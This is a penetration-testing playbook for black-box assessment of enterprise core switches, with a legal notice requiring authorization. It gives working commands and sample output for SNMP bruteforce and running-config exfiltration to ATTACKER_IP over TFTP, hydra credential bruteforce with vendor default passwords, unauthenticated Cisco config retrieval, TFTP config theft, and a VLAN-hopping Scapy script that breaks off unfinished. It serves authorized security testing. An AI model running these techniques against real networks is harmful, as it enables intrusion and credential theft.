# Core Switch VAPT Playbook — Black Box

> **Legal Notice:** This playbook is strictly for use when written authorization has been obtained from the asset owner prior to testing. Unauthorized access to network infrastructure is a criminal offence under the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act (CMA), and equivalent laws globally. All testing must remain within the defined scope and rules of engagement.

---

## What is Black Box Core Switch Testing?
In black box testing you are given **only IP addresses or subnets**. No credentials, no network diagrams, no device type information. You must discover everything yourself.

Core switches are the **backbone of an enterprise network** — they carry all inter-VLAN traffic, connect distribution layers, and often peer with routers. A compromised core switch means:
- Full visibility of all network traffic
- Ability to intercept, redirect, or drop any communication
- Access to every VLAN and subnet in the organization
- A platform for man-in-the-middle attacks against every host

---

## Testing Environment Setup

```
Attacker Machine: Kali Linux (recommended)
Connection: Direct LAN port, management VLAN port, or test VLAN
Network adapter: Promiscuous mode enabled
```

## Tools Required

| Tool | Purpose | Install |
|------|---------|---------|
| nmap | Port scanning, service detection | Pre-installed on Kali |
| snmpwalk / snmpget | SNMP enumeration | `apt install snmp` |
| onesixtyone | SNMP community string bruteforce | `apt install onesixtyone` |
| hydra | Credential bruteforce | Pre-installed on Kali |
| medusa | Credential bruteforce (alternative) | `apt install medusa` |
| telnet | Telnet session testing | `apt install telnet` |
| sslscan / testssl.sh | TLS configuration testing | `apt install sslscan` |
| wireshark / tcpdump | Traffic capture and analysis | Pre-installed on Kali |
| yersinia | Layer 2 protocol attack tool | `apt install yersinia` |
| scapy | Custom packet crafting | `pip install scapy` |
| netdiscover | ARP-based host discovery | `apt install netdiscover` |
| ike-scan | VPN/IKE testing | `apt install ike-scan` |
| enum4linux-ng | If management server attached | Available on GitHub |
| curl / wget | HTTP/HTTPS management panel testing | Pre-installed on Kali |
| nikto | Web management interface scanning | Pre-installed on Kali |
| cisco-torch | Cisco-specific scanning | Available on GitHub |
| Metasploit Framework | CVE exploitation and auxiliary modules | Pre-installed on Kali |

---

# Phase 1 — Host Discovery & Fingerprinting

## 1.1 Initial Host Discovery

**What this does and why:**
Before anything else, you need to confirm the switch is alive and reachable. Switches often block ICMP but respond on management ports. We use multiple discovery methods to ensure nothing is missed.

```bash
# Method 1: ICMP ping (basic — often blocked on hardened switches)
ping -c 4 <SWITCH_IP>

# Method 2: TCP-based host discovery (more reliable for network devices)
nmap -sn -PS22,23,80,443,161,8080,8443 <SWITCH_IP>

# Method 3: ARP discovery (most reliable if on same subnet)
arp-scan --localnet
netdiscover -r <SUBNET_CIDR> -i eth0

# Method 4: UDP probe for SNMP (switch may not respond to TCP but replies to SNMP)
nmap -sU -p161 <SWITCH_IP>
```

**Expected Secure Output:**
```
Host: <SWITCH_IP> — no response to ICMP, management access restricted to management VLAN only
SNMP — no response (filtered)
```

**Expected Vulnerable Output:**
```
Host: <SWITCH_IP> is up (0.0023s latency)
161/udp open|filtered snmp
```

---

## 1.2 Full TCP Port Scan

**What this does and why:**
Enumerating all open TCP ports reveals which management interfaces and services are exposed. Each open management port is a potential attack surface. Core switches should expose the absolute minimum — ideally only SSH on a management VLAN.

```bash
# Full SYN scan — all 65535 TCP ports
nmap -Pn -p- -sS -T3 --min-rate 500 -oN switch_tcp_full.txt <SWITCH_IP>

# Note: Use -T3 or lower for switches — aggressive scan rates can cause CPU spikes on older devices
```

**Key Ports to Look For:**

| Port | Service | Risk Level |
|------|---------|-----------|
| 22 | SSH | Low if patched, critical if old version |
| 23 | Telnet | Critical — cleartext credentials |
| 80 | HTTP web management | High — credentials sent unencrypted |
| 443 | HTTPS web management | Medium — check TLS version and ciphers |
| 161 | SNMP (UDP) | Critical if misconfigured |
| 162 | SNMP Trap (UDP) | Medium |
| 8080 | Alternate HTTP management | High |
| 8443 | Alternate HTTPS management | Medium |
| 179 | BGP | High — routing protocol exposed |
| 646 | LDP | Medium |
| 830 | NETCONF over SSH | Medium |
| 1080 | SOCKS proxy | High |
| 4786 | Cisco Smart Install | Critical — unauthenticated RCE |
| 6500 | Cisco WLC | Medium |

**Expected Secure Output:**
```
Nmap scan report for <SWITCH_IP>
22/tcp  open  ssh
All other ports: filtered
```

**Expected Vulnerable Output:**
```
23/tcp   open  telnet
80/tcp   open  http
161/udp  open  snmp
4786/tcp open  smart-install
```

> ✅ If port **4786** is open → immediately go to **Phase 9 — Cisco Smart Install** — this is a critical unauthenticated RCE

---

## 1.3 Full UDP Port Scan

**What this does and why:**
UDP services on switches (particularly SNMP) are frequently the most vulnerable component. UDP is often overlooked by administrators when applying firewall rules. Never skip this.

```bash
# Top 200 UDP ports
nmap -sU --top-ports 200 -T3 -oN switch_udp.txt <SWITCH_IP>

# Targeted critical UDP ports for switches specifically
nmap -sU -p 69,123,161,162,500,514,520,4500 <SWITCH_IP>
```

**UDP Ports of Interest:**

| Port | Service | Risk |
|------|---------|------|
| 69 | TFTP | Critical — file transfer without authentication |
| 123 | NTP | Medium — time manipulation / amplification |
| 161 | SNMP | Critical |
| 162 | SNMP Trap | Medium |
| 514 | Syslog | Low — may leak information |
| 520 | RIP | High — routing protocol |
| 521 | RIPng | High |

**Expected Secure Output:**
```
All 200 UDP ports filtered
```

**Expected Vulnerable Output:**
```
69/udp  open  tftp
161/udp open  snmp
520/udp open  route
```

---

## 1.4 Service & Version Detection

**What this does and why:**
Banner grabbing and version detection identifies the exact software version running. This lets you cross-reference with known CVE databases to find unpatched vulnerabilities without even attempting an exploit.

```bash
# Service version detection with default scripts on all open ports
nmap -sV -sC -p <OPEN_PORTS_FROM_1.2> <SWITCH_IP> -oN service_detection.txt

# Aggressive fingerprinting (more accurate but noisier)
nmap -A -p <OPEN_PORTS> <SWITCH_IP>

# Banner grab specific ports manually
nc -nv <SWITCH_IP> 22
nc -nv <SWITCH_IP> 23
curl -s http://<SWITCH_IP>/
curl -sk https://<SWITCH_IP>/
```

**Expected Secure Output:**
```
22/tcp open  ssh     OpenSSH 8.9 (or Cisco SSH implementation — no banner details)
Banner suppressed — no version information exposed
```

**Expected Vulnerable Output:**
```
22/tcp open  ssh     Cisco SSH 1.25
| banner: User Access Verification
23/tcp open  telnet
| banner: Cisco IOS Software, Version 12.4(15)T — (C3750)
```

> 🔍 If version is disclosed → look up on:
> - https://cvedetails.com/vendor/33/Cisco.html
> - https://nvd.nist.gov
> - https://sec.cloudapps.cisco.com/security/center/publicationListing.x

**Vulnerable Signs:**
- Cisco IOS version older than current train → check for known CVEs
- Any version disclosure at all → information leakage finding

---

## 1.5 Device Fingerprinting

**What this does and why:**
Identifying the exact switch model and vendor helps us select targeted attack techniques. Different vendors (Cisco, Juniper, HPE Aruba, Dell, Huawei) have different default credentials, management protocols, and known vulnerabilities.

```bash
# OS and device fingerprinting
nmap -O --osscan-guess <SWITCH_IP>

# HTTP banner fingerprinting (if web management open)
whatweb http://<SWITCH_IP>
curl -Ik http://<SWITCH_IP>

# Telnet banner fingerprinting (if port 23 open)
echo "" | nc -w3 <SWITCH_IP> 23

# SSH fingerprinting
ssh-keyscan -t rsa,ecdsa <SWITCH_IP>
nmap --script ssh-hostkey -p22 <SWITCH_IP>
```

**Expected Secure Output:**
```
OS: Unknown (device not fingerprinted — good)
HTTP: No banner or vendor-neutral banner
```

**Expected Vulnerable Output:**
```
OS: Cisco IOS 12.x
HTTP Server: Cisco IOS Embedded Web Server
X-Powered-By: Cisco IOSD
Model: WS-C3750G-24TS — reveals exact hardware for targeted attack
```

---

# Phase 2 — SNMP Enumeration

## 2.1 SNMP Community String Bruteforce

**What this does and why:**
SNMP (Simple Network Management Protocol) is the single most dangerous service on a network switch. With a read community string, an attacker gets the complete device configuration, routing table, ARP table, interface list, and running processes. With a write community string, the attacker can modify device configuration — including uploading a new config, changing routing, or disabling ports.

SNMP v1 and v2c have **no encryption and no strong authentication** — the community string is sent in cleartext. Default strings (`public` for read, `private` for write) are commonly left in place.

```bash
# Step 1: Bruteforce community strings with a wordlist
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <SWITCH_IP>
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <SWITCH_IP>

# Step 2: Try most common defaults manually
for community in public private community manager cisco admin read write monitor network secret; do
    echo -n "Trying: $community => "
    snmpget -v2c -c $community <SWITCH_IP> 1.3.6.1.2.1.1.1.0 2>/dev/null && echo "VALID" || echo "Failed"
done

# Step 3: If a community string works — confirm with basic query
snmpget -v2c -c public <SWITCH_IP> 1.3.6.1.2.1.1.1.0
# OID 1.3.6.1.2.1.1.1.0 = sysDescr — should return device description
```

**Expected Secure Output:**
```
<SWITCH_IP> [No response] for all community strings
Timeout: No Response from <SWITCH_IP>
```

**Expected Vulnerable Output:**
```
<SWITCH_IP> [public] Cisco IOS Software, Version 15.2(4)E7...
Community string 'public' accepted — read access confirmed
```

> ✅ If any community string works → immediately proceed to **Phase 2.2 — 2.6** to extract all available data

---

## 2.2 SNMP Full Walk — Device Information

**What this does and why:**
Once a valid community string is confirmed, a full SNMP walk extracts every piece of information the device exposes. This includes exact model, IOS version, serial number, uptime, contact, location — all useful for identifying specific CVEs and attack vectors.

```bash
# Full SNMP walk — everything the device exposes
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP>

# Or with v1
snmpwalk -v1 -c <COMMUNITY> <SWITCH_IP>

# System description (device type, OS version)
snmpget -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.1.1.0

# System name (hostname)
snmpget -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.1.5.0

# System location (physical location — OSINT value)
snmpget -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.1.6.0

# System contact (admin name / email — social engineering value)
snmpget -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.1.4.0

# System uptime
snmpget -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.1.3.0
```

**Expected Secure Output:**
```
Timeout: No Response — SNMP v1/v2c disabled, only SNMPv3 with auth+priv
```

**Expected Vulnerable Output:**
```
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 12.2(55)SE12
SNMPv2-MIB::sysName.0 = STRING: CORE-SW-01
SNMPv2-MIB::sysLocation.0 = STRING: Server Room B, Rack 3 — Building 2
SNMPv2-MIB::sysContact.0 = STRING: admin@company.com — John Smith
```

**Vulnerable Signs:**
- Any data returned at all → SNMP v1/v2c with community string is a finding
- Physical location disclosed → security risk for physical attack planning
- Contact email disclosed → social engineering / phishing target

---

## 2.3 SNMP — Network Interface & IP Enumeration

**What this does and why:**
The interface table reveals every network interface on the switch — including management interfaces, VLANs, and uplinks. The IP address table reveals every IP subnet the switch participates in. This builds the complete network map.

```bash
# All interfaces
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.2.2

# Interface names
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.31.1.1.1.1

# Interface status (up/down)
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.2.2.1.8

# All IP addresses assigned
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.4.20.1.1

# IP routing table — full network topology
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.4.21

# ARP table — all hosts the switch knows about
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.2.1.4.22
```

**Vulnerable Signs:**
- Full internal network topology disclosed from SNMP
- Management IP on same subnet as user VLAN (no segmentation)
- ARP table reveals additional hosts for further testing

---

## 2.4 SNMP — VLAN Enumeration

**What this does and why:**
Knowing the VLAN structure is critical for finding VLAN hopping attack opportunities. Cisco switches expose VLAN tables via SNMP.

```bash
# Cisco VLAN table
snmpwalk -v2c -c <COMMUNITY>@<VLAN_ID> <SWITCH_IP> 1.3.6.1.4.1.9.9.46.1.3.1

# VLAN names
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.4.1.9.9.46.1.3.1.1.4

# Port VLAN assignments
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.4.1.9.9.46.1.6.1.1.2

# VLAN membership for each port
snmpwalk -v2c -c <COMMUNITY> <SWITCH_IP> 1.3.6.1.4.1.9.9.68.1.2.2.1.2
```

**Vulnerable Signs:**
- VLAN IDs and names exposed → internal network segmentation scheme disclosed
- Native VLAN = VLAN 1 with user traffic → VLAN hopping possible
- Management VLAN in same range as user VLANs

---

## 2.5 SNMP — Running Configuration Extraction (Critical)

**What this does and why:**
On some Cisco devices, SNMP write access combined with TFTP allows extraction of the complete running configuration — including all passwords, ACLs, routing configs, and community strings themselves. This is a full device takeover via SNMP.

```bash
# Step 1: Set up TFTP server on attacker machine to receive config
mkdir /tmp/tftp && cd /tmp/tftp
atftpd --daemon --port 69 /tmp/tftp
# Or: python3 -m tftpy.TftpServer /tmp/tftp

# Step 2: Trigger config backup via SNMP write
# OID: ccCopySourceFileType (runningConfig=4) → copy to TFTP
snmpset -v2c -c <WRITE_COMMUNITY> <SWITCH_IP> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 a <ATTACKER_IP> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s running-config.txt \
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1

# Step 3: Check TFTP directory for received config
ls -la /tmp/tftp/
cat /tmp/tftp/running-config.txt

# Step 4: Search config for passwords and community strings
grep -iE "password|secret|community|key|enable|username" /tmp/tftp/running-config.txt
```

**Expected Secure Output:**
```
snmpset: Timeout — write community string rejected
TFTP: No file received — SNMP write access denied
```

**Expected Vulnerable / Critical Output:**
```
# Config received at /tmp/tftp/running-config.txt containing:
enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
username admin password 0 cisco123
snmp-server community public RO
snmp-server community private RW
```

> ⚠️ **Critical Finding:** Full configuration disclosure via SNMP write + TFTP

---

## 2.6 SNMPv3 User Enumeration

**What this does and why:**
Even if v1/v2c is disabled, SNMPv3 may be configured. SNMPv3 usernames can be enumerated because the device gives different error responses for valid vs invalid usernames — even without knowing the authentication password.

```bash
# Enumerate SNMPv3 users (no auth required — error response differs)
nmap --script snmp-brute -p161 --script-args \
  snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt \
  <SWITCH_IP>

# Test specific known usernames for SNMPv3
snmpget -v3 -u admin -l noAuthNoPriv <SWITCH_IP> 1.3.6.1.2.1.1.1.0
snmpget -v3 -u snmpuser -l noAuthNoPriv <SWITCH_IP> 1.3.6.1.2.1.1.1.0
snmpget -v3 -u monitor -l noAuthNoPriv <SWITCH_IP> 1.3.6.1.2.1.1.1.0

# Read response: if "Unknown user name" → invalid; if "Authentication failure" → username is valid
```

**Expected Secure Output:**
```
snmpget: Unknown user name — uniform error regardless of username existence
```

**Expected Vulnerable Output:**
```
snmpget: Authentication failure for user 'admin' — username EXISTS, wrong auth key
snmpget: Unknown user name for user 'wronguser' — username does not exist
```

**Vulnerable Signs:**
- Different error messages for valid vs invalid SNMPv3 users → username enumeration possible
- SNMPv3 with `noAuthNoPriv` (no authentication required) configured → equivalent to v2c

---

# Phase 3 — Management Protocol Testing

## 3.1 Telnet — Cleartext Authentication

**What this does and why:**
Telnet transmits all data — including usernames and passwords — in plaintext. Any device on the same network path can intercept credentials. Telnet should never be enabled on production network devices.

```bash
# Step 1: Confirm Telnet is open
nmap -p23 <SWITCH_IP>

# Step 2: Connect and capture the banner
telnet <SWITCH_IP>
# Observe: what banner is shown? Does it reveal device type/version?

# Step 3: Test for empty/default credentials
telnet <SWITCH_IP>
# Try: (blank password), cisco, admin, password, switch

# Step 4: If on same LAN segment — capture Telnet session with tcpdump
tcpdump -i eth0 host <SWITCH_IP> and port 23 -w telnet_capture.pcap -v
# Open in Wireshark → Follow TCP Stream → credentials visible in cleartext
```

**Expected Secure Output:**
```
23/tcp filtered — Telnet disabled or port blocked
```

**Expected Vulnerable Output:**
```
23/tcp open telnet
Trying <SWITCH_IP>...
Connected to <SWITCH_IP>.
Escape character is '^]'.

User Access Verification
Username: admin
Password: (visible in Wireshark as plaintext: cisco123)
CORE-SW-01>
```

**Vulnerable Signs:**
- Port 23 open = immediate High/Critical finding regardless of password strength
- Credentials captured in cleartext in Wireshark = Critical

---

## 3.2 SSH Testing

**What this does and why:**
Even if SSH is correctly used instead of Telnet, the SSH implementation may have vulnerabilities. Old SSH versions have known cryptographic weaknesses, weak algorithms may be enabled, and SSH may be accessible from unauthorized networks.

```bash
# Step 1: Check SSH version (SSHv1 is broken cryptographically)
nmap --script ssh2-enum-algos -p22 <SWITCH_IP>
ssh -V <SWITCH_IP>  # local ssh version info

# Step 2: Enumerate supported algorithms
nmap --script ssh2-enum-algos -p22 <SWITCH_IP>

# Step 3: Check if SSH version 1 is accepted (deprecated — serious)
ssh -1 <SWITCH_IP> 2>&1

# Step 4: Check host key type and size
ssh-keyscan -t rsa,ecdsa,ed25519 <SWITCH_IP>
nmap --script ssh-hostkey -p22 <SWITCH_IP>

# Step 5: Test if SSH brute force is rate limited (3 attempts — observe delay)
hydra -l admin -P /usr/share/wordlists/top10_passwords.txt <SWITCH_IP> ssh \
  -t 1 -W 3 -f -V
```

**Expected Secure Output:**
```
SSH version 2 only
Supported algos: curve25519-sha256, ecdh-sha2-nistp256
Key exchange: strong (no diffie-hellman-group1-sha1 or diffie-hellman-group14-sha1)
Ciphers: aes256-gcm, aes128-gcm (no 3des-cbc, arcfour, blowfish)
MACs: hmac-sha2-256, hmac-sha2-512 (no hmac-md5, hmac-sha1)
Rate limit / lockout active after failed attempts
```

**Expected Vulnerable Output:**
```
SSH Protocol: 1.5 — SSHv1 accepted
Weak algorithms: diffie-hellman-group1-sha1 (Logjam), diffie-hellman-group14-sha1
Weak ciphers: 3des-cbc, arcfour128
Weak MACs: hmac-md5, hmac-sha1-96
No rate limiting — brute force possible at full speed
```

**Vulnerable Signs:**
- SSHv1 enabled → Critical (protocol broken — vulnerable to man-in-the-middle)
- `diffie-hellman-group1-sha1` → Logjam attack → Critical
- `3des-cbc` or `arcfour` → SWEET32 attack → Medium
- No brute force protection → High

---

## 3.3 Default & Common Credential Testing

**What this does and why:**
Network devices are frequently deployed with default credentials and never changed. This is one of the most common critical findings in infrastructure assessments. We test SSH, Telnet, and web management panels.

> ⚠️ **Always confirm lockout policy before running any automated tool. Manual testing with 3–5 attempts is safer.**

```bash
# Manual test — common defaults (do this before any automated tool)
# Cisco: admin/cisco, cisco/cisco, admin/admin, admin/(blank), (blank)/(blank)
# Juniper: root/(blank), admin/admin123
# HPE Aruba: admin/admin, manager/manager
# Dell: admin/admin, root/calvin
# Huawei: admin/Admin@huawei.com, huawei/huawei

ssh admin@<SWITCH_IP>         # try password: cisco, admin, password, (blank)
ssh cisco@<SWITCH_IP>         # try password: cisco
ssh root@<SWITCH_IP>          # try password: (blank), root, password

# Automated brute force on SSH (only with explicit written permission + lockout confirmed absent)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
      <SWITCH_IP> ssh -t 1 -W 5 -f

# For Telnet (if open)
hydra -L usernames.txt -P passwords.txt <SWITCH_IP> telnet -t 1 -W 5 -f

# For HTTP management panel
hydra -L usernames.txt -P passwords.txt <SWITCH_IP> http-get / -t 2 -W 5 -f
hydra -L usernames.txt -P passwords.txt http-form-post://<SWITCH_IP>/login \
  "username=^USER^&password=^PASS^:F=Invalid" -t 2 -W 5 -f
```

**Expected Secure Output:**
```
[ERROR] 1 target completed, 0 valid password found
Account lockout triggered after 5 failed attempts
Response time increases with each attempt (rate limiting)
```

**Expected Vulnerable Output:**
```
[22][ssh] host: <SWITCH_IP> login: admin password: cisco
[SUCCESS] Valid credential found — default password in use
No lockout — tested 50+ passwords without account block
```

---

## 3.4 Enable Password / Privilege Escalation Testing

**What this does and why:**
Even with a low-privilege login, if the enable password is weak or the same as the login password, the attacker gains full privileged access to the device configuration.

```bash
# After gaining a basic login session — test enable password:
ssh admin@<SWITCH_IP>
# At prompt:
# Switch> enable
# Password: (try: enable, cisco, admin, (blank), same as login password)

# Check if privilege 15 is granted without enable password (misconfiguration)
# After SSH login:
# Switch> show privilege
# If output is "Current privilege level is 15" → full access without enable password
```

**Expected Secure Output:**
```
Switch> show privilege
Current privilege level is 1
Switch> enable
Password: (complex — not guessable)
% Access denied
```

**Expected Vulnerable Output:**
```
Switch> enable
Password: (blank or same as login)
Switch# show running-config  — full privileged access granted
```

**Vulnerable Signs:**
- Enable password same as login password → High
- Enable password blank → Critical
- Privilege level 15 granted at login without enable prompt → Critical

---

# Phase 4 — Web Management Interface Testing

## 4.1 HTTP/HTTPS Management Panel Discovery

**What this does and why:**
Many switches have web-based management interfaces. HTTP management sends credentials in cleartext. HTTPS management may use weak TLS versions or weak ciphers.

```bash
# Check which web ports respond
nmap -p80,443,8080,8443 -sV <SWITCH_IP>

# Fetch the root page and observe headers
curl -Ik http://<SWITCH_IP>/
curl -Ik https://<SWITCH_IP>/

# Identify management platform
whatweb http://<SWITCH_IP>
whatweb https://<SWITCH_IP>

# Screenshot the management panel
eyewitness --web -f <(echo "http://<SWITCH_IP>") --no-prompt
```

**Expected Secure Output:**
```
80/tcp closed — HTTP disabled
443/tcp open — HTTPS only, with valid certificate and modern TLS
```

**Expected Vulnerable Output:**
```
80/tcp open http — Cisco IOS HTTP Server
Server: cisco-IOS
Credentials transmitted over HTTP (no TLS)
```

---

## 4.2 TLS Configuration Testing

**What this does and why:**
Weak TLS versions (TLS 1.0, 1.1, SSLv3) and weak cipher suites allow attackers to decrypt management traffic, enabling credential theft. The switch management interface is a high-value target for this.

```bash
# Comprehensive TLS testing (most complete tool)
testssl.sh <SWITCH_IP>:443

# Alternative with sslscan
sslscan --no-failed <SWITCH_IP>:443

# Nmap TLS testing
nmap --script ssl-cert,ssl-enum-ciphers -p443,8443 <SWITCH_IP>

# Check specific known weaknesses
nmap --script ssl-dh-params -p443 <SWITCH_IP>   # Logjam / FREAK
nmap --script ssl-heartbleed -p443 <SWITCH_IP>  # Heartbleed
nmap --script ssl-poodle -p443 <SWITCH_IP>      # POODLE (SSLv3)
nmap --script ssl-ccs-injection -p443 <SWITCH_IP> # CVE-2014-0224
```

**Expected Secure Output:**
```
Protocols:
  SSLv2:   disabled
  SSLv3:   disabled
  TLSv1.0: disabled
  TLSv1.1: disabled
  TLSv1.2: offered (OK)
  TLSv1.3: offered (OK)

Ciphers: Only AEAD ciphers (AES-GCM, ChaCha20)
No RC4, DES, 3DES, EXPORT, NULL, ANON ciphers
Forward Secrecy: offered
HSTS: included in response headers
```

**Expected Vulnerable Output:**
```
SSLv3: offered — POODLE attack possible
TLSv1.0: offered — BEAST/POODLE attack possible
Weak ciphers: RC4, DES-CBC3, EXPORT-grade
No Forward Secrecy — historical sessions decryptable
HEARTBLEED: VULNERABLE
```

---

## 4.3 Security Headers Check

**What this does and why:**
Web management panels without proper HTTP security headers are vulnerable to clickjacking (framing in a malicious page to steal admin clicks), MIME sniffing attacks, and cross-site scripting via missing CSP.

```bash
curl -Ik https://<SWITCH_IP>/ | grep -iE "strict-transport|x-frame|x-content|content-security|referrer|permissions"
nmap --script http-security-headers -p443 <SWITCH_IP>
```

**Expected Secure Output:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
```

**Expected Vulnerable Output:**
```
HTTP/1.1 200 OK
Server: Cisco IOS HTTP Server
(No security headers present)
```

---

## 4.4 HTTP Methods Check

**What this does and why:**
Dangerous HTTP methods like PUT, DELETE, and TRACE should be disabled on management interfaces. Enabled TRACE can enable cross-site tracing (XST) attacks to steal cookies.

```bash
nmap --script http-methods -p80,443 <SWITCH_IP>
curl -X OPTIONS http://<SWITCH_IP>/ -v 2>&1 | grep Allow
curl -X TRACE http://<SWITCH_IP>/ -v
```

**Expected Secure Output:**
```
Allowed methods: GET, POST
```

**Expected Vulnerable Output:**
```
Allowed methods: GET, POST, PUT, DELETE, TRACE, CONNECT
```

---

## 4.5 Web Directory Discovery

**What this does and why:**
Switch web interfaces sometimes expose debugging pages, backup configuration endpoints, or diagnostic pages that should not be publicly accessible.

```bash
# Common paths for network device web management
gobuster dir -u http://<SWITCH_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -t 10 -b 401,403,404 -k

# Nikto scan for known issues
nikto -h http://<SWITCH_IP> -ssl -output nikto_switch.txt

# Common interesting paths to check manually:
curl -sk http://<SWITCH_IP>/level/15/exec/-/show/running-config   # Cisco HTTP priv escalation
curl -sk http://<SWITCH_IP>/showtech                               # Show tech-support
curl -sk http://<SWITCH_IP>/config.html
curl -sk http://<SWITCH_IP>/status
```

**Expected Secure Output:**
```
All paths return 401 (Authentication Required) or 404
```

**Expected Vulnerable / Critical Output:**
```
http://<SWITCH_IP>/level/15/exec/-/show/running-config → 200 OK
Returns full running configuration without authentication
# This is a known Cisco IOS HTTP Server vulnerability — CVE-2001-0537 / similar
```

---

# Phase 5 — TFTP Testing

## 5.1 TFTP Service Detection and Anonymous Access

**What this does and why:**
TFTP (Trivial File Transfer Protocol) has no authentication whatsoever. If enabled on a switch, it allows anyone to upload or download files — including the device configuration. Attackers can download the running config (with all passwords) or upload a modified config to take over the device.

```bash
# Step 1: Confirm TFTP is running
nmap -sU -p69 <SWITCH_IP>

# Step 2: Attempt to download known files — no authentication needed
atftp <SWITCH_IP>
# At prompt: get running-config.cfg

# Or with curl
curl tftp://<SWITCH_IP>/running-config
curl tftp://<SWITCH_IP>/startup-config
curl tftp://<SWITCH_IP>/config.text

# Step 3: Test file upload capability
echo "test" > test.txt
atftp --put --local-file test.txt <SWITCH_IP>
```

**Expected Secure Output:**
```
69/udp filtered — TFTP not accessible
atftp: timeout after multiple retries — no response
```

**Expected Vulnerable Output:**
```
69/udp open — TFTP running
Downloaded: running-config.cfg (15KB) — full device configuration
File contains: enable secret, usernames, SNMP communities
```

---

# Phase 6 — NTP Testing

## 6.1 NTP Mode 6 / Mode 7 Queries

**What this does and why:**
NTP (Network Time Protocol) misconfigurations on switches allow two attacks: (1) NTP amplification — using the switch as a DDoS amplifier against a third party; (2) NTP mode 6/7 — querying the NTP daemon for sensitive operational data including connected peers, memory stats, and system info. Time manipulation attacks can also affect log integrity and Kerberos authentication.

```bash
# Check if NTP is running
nmap -sU -p123 <SWITCH_IP>

# Query NTP peers (monlist — amplification risk)
ntpq -c monlist <SWITCH_IP>
nmap --script ntp-monlist -p123 <SWITCH_IP>

# Query NTP info (mode 6)
ntpq -c readvar <SWITCH_IP>
ntpq -c sysinfo <SWITCH_IP>

# Check if NTP amplification is possible
nmap --script ntp-info -sU -p123 <SWITCH_IP>
```

**Expected Secure Output:**
```
NTP: Monlist disabled — no response
Mode 6 queries disabled
NTP access restricted to specific server IPs only
```

**Expected Vulnerable Output:**
```
ntpq: Remote peer list returned — monlist enabled
Amplification factor: ~200x — switch usable as DDoS amplifier
System info disclosed: NTP version, kernel version, last sync
```

**Vulnerable Signs:**
- Monlist enabled → NTP amplification DDoS risk → Medium
- NTP version disclosed → check for NTP CVEs for that version
- No authentication for NTP peer configuration changes → attackers can inject false time

---

# Phase 7 — CDP / LLDP Information Disclosure

## 7.1 CDP Neighbor Discovery

**What this does and why:**
Cisco Discovery Protocol (CDP) and LLDP (Link Layer Discovery Protocol) are neighbor discovery protocols that switches send to all directly connected devices every 60 seconds. They contain detailed device information — model, software version, IP addresses, VLAN IDs, and more — all in plaintext with no authentication. Any device connected to a switch port receives this information automatically.

> **Note:** CDP/LLDP is only received by devices directly connected to the switch port. You cannot sniff CDP from across the network — you must be on a directly connected port.

```bash
# Method 1: Capture CDP packets with Wireshark (most reliable)
# Open Wireshark → select interface → Filter: cdp or lldp → wait 60-90 seconds

# Method 2: tcpdump to capture CDP frames
tcpdump -i eth0 -nn ether host 01:00:0c:cc:cc:cc -w cdp_capture.pcap

# Method 3: Using Yersinia
yersinia -G    # GUI mode → select CDP → sniff

# Method 4: Nmap script (if switch has management port answering)
nmap --script cdp-info -p161 <SWITCH_IP>

# Method 5: Parse captured pcap
tcpdump -r cdp_capture.pcap -A
```

**Expected Secure Output:**
```
No CDP/LLDP frames received (CDP disabled globally or on edge ports)
CDP enabled only on uplink/trunk ports — not on access ports facing users
```

**Expected Vulnerable Output:**
```
CDP frame received from: <SWITCH_IP>
Device ID: CORE-SW-01
Platform: Cisco WS-C4507R+E
IOS version: 15.2(7)E3
Management IP: 192.168.10.1
Native VLAN: 1
Capabilities: Router Switch IGMP
Port: GigabitEthernet1/0/12
```

**Vulnerable Signs:**
- CDP enabled on access ports facing end users → full device fingerprinting by any user
- IOS version disclosed → immediate CVE lookup possible
- Native VLAN ID disclosed → assists VLAN hopping attack (Phase 8)

---

# Phase 8 — Layer 2 Attack Surface Testing

## 8.1 VLAN Hopping — Double Tagging Attack

**What this does and why:**
VLAN hopping allows an attacker on one VLAN to send traffic into another VLAN that they should have no access to. The double-tagging attack works when the native VLAN on a trunk port is the same as the attacker's VLAN — the switch strips the outer tag and forwards the inner-tagged packet to the target VLAN.

> **Prerequisite:** You must know the native VLAN ID — obtained from CDP (Phase 7) or SNMP (Phase 2.4)

```bash
# Using Scapy to craft a double-tagged frame
python3 << 'EOF'
from scapy.all import *

# Replace: native_vlan with the native VLAN ID from CDP/SNMP
# Replace: target_vlan with VLAN you want to reach
# Replace: target_ip with an IP in the target VLAN

native_vlan = 1       # from CDP discovery
